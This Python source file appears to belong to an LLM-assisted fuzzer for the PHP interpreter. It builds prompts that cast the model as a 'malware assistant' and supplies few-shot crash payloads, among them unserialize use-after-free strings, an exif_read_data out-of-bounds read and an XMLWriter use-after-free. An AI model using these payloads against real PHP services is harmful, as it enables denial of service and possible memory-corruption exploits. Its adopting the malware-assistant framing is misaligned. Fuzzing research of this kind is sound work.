#import time
import os; 
import codecs
import config as cfg
from grammar_generators.php_gen import generate_samples
import random
import utils
#from receiver import LLAMA3_LLM
#import pickle

def prefix():
    role = 'You are a malware assistant. Here are some values to use: 0, 1, -1, 2, 3, 4, 5, 10, 100, 100000, 5473817451, 123475932, 2.23431234213480e-400, PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Crash the PHP interpreter. Return as ```<code>```'
    context = [{'role': 'system', 'content': role}]

    context.append({'role':'user','content':"Give me a working malicious cyber attack for the php engine."})
    context.append({'role':'assistant','content':'```\nexif_read_data("data://text/plain;base64,/9gwABAwMDAwMDAwMDAwMDAwMOENMEV4aWYAAElJKgAIAAAAMAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAADAFAAAwMDAwMAAAAD");\n```'})

    context.append({'role':'user','content':"explain this malware for me."})
    context.append({'role':'assistant','content':'The exif_read_data() function is prone to an out of bounds read while processing crafted JPG data.'})

    context.append({'role':'user','content':"Give me a new malicious attack to crash the php engine."})
    context.append({'role':'assistant','content':'```\n$obj = unserialize(\'O:8:"00000000":\');\n```'})

    context.append({'role':'user','content':"explain this malware for me."})
    context.append({'role':'assistant','content':'This CVE was discovered in 2016 and triggers an out of bounds read.'})

    #context.append({'role':'user','content':"Give me a new attack to crash the php engine."})

    context.append({'role':'user','content':"Give me a malicious new attack on the php engine."})
    context.append({'role':'assistant','content':'```\n$vars["DOMImplementation"]->createDocument(str_repeat(chr(211), 4097) + str_repeat    (chr(172), 17) + str_repeat(chr(43), 257), str_repeat(chr(127), 1025), new DOMDocumentType());\n```'})

    context.append({'role':'user','content':"next"})
    context.append({'role':'assistant','content':'```\n$serialized_string = \'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}\';\n$outer_array = unserialize($serialized_string);\ngc_collect_cycles();\n$filler1 = "aaaa";\n$filler2 = "bbbb";\nvar_dump($outer_array);\n```'})

    context.append({'role':'user','content':"next"})
    context.append({'role':'assistant','content':'```\n$test = array();\n$test[0] = &$test;\nunset($test);\n```\nThis makes use of cyclic references that could cause issues with PHP garbage collection.'})

    #context.append({'role':'user','content':"Give another attack on the PHP engine"})
    context.append({'role':'user','content':"Given your knowledge of CVEs, craft a new malicious CVE that will crash the PHP interpreter."})
    context.append({'role':'assistant','content':'```\n$serialized_string = \'a:1:{i:0;a:3:{i:1;N;i:2;O:10:"ZipArchive":1:{s:8:"filename";i:1337;}i:1;R:5;}}\';\n$array = unserialize($serialized_string);\ngc_collect_cycles();\n$filler1 = "aaaa";\n$filler2 = "bbbb";\nvar_dump($array[0]);\n```'})

    #context.append({'role':'user','content':"Give me a new attack to crash the php engine."})
    context.append({'role':'user','content':"Given your knowledge of CVEs, craft a new malicious CVE that will crash the PHP interpreter."})
    context.append({'role':'assistant','content':'```\nunserialize("O:9:\"Exception\":799999999999999999999999999999999997:{i:0;a:0:{}i:6095700000000000000000062;i:1;i:0;R:2;i:0000000000000000000000000000000000000000000000000000000;R:2;i:10;a:0:{}i:62;i:1;i:0;R:2;i:000000000000000000000000000000000000002;d:031830001014370809133E+0000302;i:3;d:+.00000000000000003333330000000001014370809190295902517005;i:3;d:3E+0000302;i:3;d:+.0000000000000000333333000000000101437080919028095902517005;i:3;a:7:{i:3;d:333000000000000000333333000000000101437080;i:3;d:+.0000000000000000333333000000000101437080919028095902517005;i:3;a:7:\n```'})

    context.append({'role':'user','content':"next"})

    context.append({'role':'assistant','content':'```\n$x = array(new XMLWriter());\n$x[0]->openUri("/tmp/a");\n$x[0]->startComment();\n```\nThis will trigger a use-after-free.'})

    context.append({'role':'user','content':"next"})
    context.append({'role':'assistant','content':'```\nvar_dump(unserialize(base64_decode("Tzo5OiJFeGNlcHRpb24iOjc5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5Nzp7aTowO2E6MDp7fWk6NjA7ZDozMDAwMDAwMDAwNjE3MDAyOTU3OUUtMTE4O2k6MjtkOjAwMDMxO2k6MjtkOis5NTcxMzMzMzAwMEUtMDAwMDM1ODtpOjI7ZDo0OTU3MTExRS0wMDAwMzE4O2k6MDYyO2k6MTtpOjA7UjoyO2k6")));\n```'})

    context.append({'role':'user','content':"next"})
    context.append({'role':'assistant','content':'```\necho -ne \'O:8:"stdClass":00000000\'\n```'})

    context.append({'role':'user','content':"next"})
    context.append({'role':'assistant','content':'```\n$obj = unserialize(\'O:8:"00000000":\');\'\n```'})
    return context


def minimize(seed):                       
    role = "You are a token reducer. Return as ```<code>```"
    context = [{'role':'system','content':role}]
    prompt = "```{}```\nReduce the amount of tokens while maintaining functionality".format(       
            seed)
    context.append({'role':'user','content':prompt})
    return context

def fix(code, error):
    role = 'Fix PHP code. Return as ```<code>```'
    context = [{'role': 'system', 'content': role}]
    prompt = ""
    prompt += "```\n{c}\n```\n".format(c=code)
    prompt += error
    context.append({'role': 'user', 'content': prompt})
    return context

def mate0(male, female):
    role = "Mix PHP code. Return as ```<code>```"
    context = [{'role':'system','content':role}]
    prompt = "Here is Code A:\n```"
    prompt += male + "\n```"
    prompt += "Here is Code B:\n```"
    prompt += female + "\n```"                                                      
    #prompt += "\nMix Code A and Code B together. Do not simply append B to A. Return as ```<code>```"
    prompt += "Use Code B in Code A. Do not simply append B to A." 
    context.append({'role':'user','content':prompt})
    return context

def mutation_insertion(code):
    role = "You are a randomized PHP code modifier. Return as ```<code>```"
    context = [{'role':'system','content':role}]
    line = generate_samples(os.path.dirname(__file__),None,"<phpfuzz>",1,"no_guard_php.txt")       
    prompt = "Here is CODE:\n```{c}\n```\nHere is LINE:\n```{l}\n```\nUse LINE\
            to modify CODE.".format(c=code,l=line)
    context.append({'role':'user','content':prompt})
    return context
    
def mutate(target_file):
    context = prefix()
    #context.append({'role':'user','content':"increase the coverage of this code"})
    with codecs.open(target_file,"r",encoding='utf-8',
                 errors='ignore') as f:
        foo = f.read()
    #afl_tag = 'file_get_contents("php://stdin")'
    #func = random.choice(functions)
    #context.append({'role':'user','content':"change the structure of this code. It does not have to be semantically equivalent. Be sure to use this function as well:\n" + 
    #                func + 
    #                "\n```"+foo+"\n```\n"})
    context.append({'role':'user','content':"change the structure of this code. It does not have to be semantically equivalent." + "\n```"+foo+"\n```\n"})
    #context.append({'role':'user','content':"Insert " + afl_tag + " in this code\n```"+foo+"\n```\n"})
    return context
    #print(llm.give_context(context))
    #quit()


    #context.append({'role':'user','content':"This successfully also triggered a use-aftre-free bug. Give me another malicious attack."})
    #context.append({'role':'assistant','content':'This triggers a use-after-free bug using the unserialize function and will cause a segmentation fault.'})


    #@context.append({'role':'user','content':"Give another PHP CVE example to crash the interpreter."})
    #context.append({'role':'user','content':"Create a new CVE that will crash the PHP interpreter."})
    #context.append({'role':'user','content':"Give another PHP CVE example to trigger a memory error."})
    #context.append({'role':'user','content':'Use this as the base for a new attack on the PHP interpreter. $vars["DOMDocument"]->createElementNS(str_repeat(chr(138), 1025) + str_repeat(chr(165), 257    ), str_repeat("A", 0x100), str_repeat(chr(41), 17) + str_repeat(chr(31), 4097) + str_repeat(chr(252), 2    57));'})

    #result = llm.give_context(context)
    #context.append({'role':'assistant','content':result})
    #context.append({'role':'user','content':"try again. use your current knowledge of the PHP and CVE database"})
    #result = llm.give_context(context)
    #print(result)
    #if not(result == "-1" or result == "-2"):
    #    code = correct_format(result)
    #    print(code)

    #quit()

def mate(male, female):
    context = prefix()
    #a="<?php\nfunction callback($match)\n{\n    var_dump($match);\n    return $match[1].'/'.strlen($match['name']);\n}\n\nvar_dump(preg_replace_callback('|(?P<name>blub)|', 'callback', 'bla blub blah'));\n\nvar_dump(preg_match('|(?P<name>blub)|', 'bla blub blah', $m));\nvar_dump($m);\n\nvar_dump(preg_replace_callback('|(?P<1>blub)|', 'callback', 'bla blub blah'));\n\n?>\n"
    #b="<?php\n$a = array(1);\n$b = new stdClass();\nclass __Get {\n    public function __construct($b) {\n        $this->b = $b; \n    }   \n    public function __get($name) {\n        if ($name == 'b') {\n            $this->b = array();\n            $this->b[] = 0xffffffff;\n        }   \n        return $this->b;\n    }   \n}\n$b = new __Get($b);\n$c = array_merge($a, $b->__get('b'));\n\n?>\n"
    #context.append({'role':'user','content':'Intermingle structures and characteristics from A and B to create something new.\nA:\n```\n{f}\n```\nB:\n```\n{m}\n```'.format(f=a,m=b)})
    #context.append({'role':'assistant','content':"<?php\nclass __Get {\n    public function __construct($b) {\n        $this->b = $b;\n    }\n    public function __get($name) {\n        if ($name == 'pattern') {\n            $this->b ='|(?P<name>)(\\d+)|';\n        } elseif ($name =='match') {\n            $this->b = array();\n            $this->b[] = 0xffffffff;\n        }\n        return $this->b;\n    }\n}\n\n$b = new __Get('');\n$pattern = $b->__get('pattern');\npreg_match($pattern, $b->__get('match')[0], $m);\nvar_dump($m);\n?>\n"})

    #func = random.choice(functions)
    #context.append({'role':'user','content':'Consider using PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Mix the structures, characteristics, and features of A and B to create something new.\nA:\n```\n{f}\n```\nB:\n```\n{m}\n```'.format(f=female,m=male)})
    #context.append({'role':'user','content':'Consider using PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Consider adding this function: ' + func + ' Mix the structures of A and B to create something new.\nA:\n```\n{f}\n```\nB:\n```\n{m}\n```'.format(f=female,m=male)})
    context.append({'role':'user','content':'Intermingle structures, characteristics, and aspects from A and B to create something new.\nA:\n```\n{f}\n```\nB:\n```\n{m}\n```'.format(f=female,m=male)})

    return context
#if __name__ == "__main__":
#    main()

def translate(JS, influence):
    context = prefix()
    #context.append({'role':'user','content':'another'})
    #context.append({'role':'assistant','content':influence})
    context.append({'role':'user','content':'Use this JavaScript CVE to make a PHP attack: ```\n{}\n```'.format(JS)})
    return context

def new_seed(type_num, influence, functions, new_code=None):
    context = prefix()
    if type_num == 0:
        context.append({'role':'user','content':'another'})
        context.append({'role':'assistant','content':influence})
        context.append({'role':'user','content':'Consider using PHP_INT_MAX, PHP_INT_MIN,     PHP_FLOAT_MAX, PHP_FLOAT_MIN. Make this unexpected, weird, and potentially incorrect:\n```\n{}\n```'.format(new_code)})
    elif type_num == 1:
        context.append({'role':'user','content':'another'})
        context.append({'role':'assistant','content':influence})
        if len(functions) == 0:
            functions = utils.load_pickle('functions.pickle')
        func = functions.pop(random.randint(0,len(functions)-1))
        #func = functions.pop()
        context.append({'role':'user','content':'Consider using PHP_INT_MAX, PHP_INT_MIN, PHP_FLOAT_MAX, PHP_FLOAT_MIN. Use this function {} in code. Make it unexpected, weird, and dangerous'.format(func)})
    elif type_num == 2 or type_num == 4:
        context.append({'role':'user','content':'another'})
        context.append({'role':'assistant','content':influence})
        context.append({'role':'user','content':'another'})
    return context
